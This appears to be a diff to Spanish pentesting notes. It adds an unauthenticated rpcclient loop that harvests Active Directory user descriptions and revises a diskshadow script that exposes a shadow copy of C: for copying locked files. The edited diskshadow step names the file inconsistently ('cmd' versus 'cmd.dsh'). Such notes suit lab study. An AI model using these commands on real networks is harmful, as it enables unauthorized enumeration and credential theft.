@@ -759,6 +759,9 @@ rpcclient -U "" -N <RHOST> -c "lookupnames root"
 # en un servidor remoto. Es útil para obtener información sobre los grupos de 
 # seguridad disponibles en un sistema y sus respectivos SID.
 rpcclient -U "" -N <RHOST> -c "lsaenumsid"
+
+# Buscar posible información en la descripción del usuario
+for user in $(cat ad_users.txt); do rpcclient -U '' -N megabank.local -c "queryuser $user"; done | grep -E "User Name|Description"
 ```
 
 El parámetro `-c` en `rpcclient` se utiliza para especificar un comando o una secuencia de comandos que se ejecutarán en el servidor remoto una vez que se haya establecido la conexión. Esto permite realizar operaciones específicas de forma automática sin necesidad de interactuar manualmente con `rpcclient` después de establecer la conexión.
@@ -2914,12 +2917,13 @@ Para superar este problema, podemos utilizar la herramienta `diskshadow`, una fu
 
 En nuestra máquina de atacante, creamos un archivo DSH utilizando un editor de texto. Este archivo contendrá los comandos necesarios para que diskshadow cree una copia de la unidad C: en una unidad virtual Z:. Aquí está el contenido del archivo DSH:
 
-```powershell
-> vim archivo.dsh
+```bash
+> vim cmd
 set context persistent nowriters
-add volume c: alias backup
+add volume c: alias cmd
 create
-expose %backup% z:
+expose %cmd% z:
+> unix2dos cmd.dsh
 ```
 
 - `set context persistent nowriters`: Configura el contexto para crear una copia en la sombra persistente y sin escritura.
@@ -2932,7 +2936,7 @@ expose %backup% z:
 Dado que el archivo DSH se crea en un entorno Linux, debemos asegurarnos de que sea compatible con Windows. Para ello, usamos la herramienta `unix2dos`, que convierte la codificación y el espaciado del archivo a un formato compatible con Windows:
 
 ```bash
-unix2dos archivo.dsh
+unix2dos cmd.dsh
 ```
 
 Esto asegura que los saltos de línea y la codificación sean correctos para su ejecución en Windows.
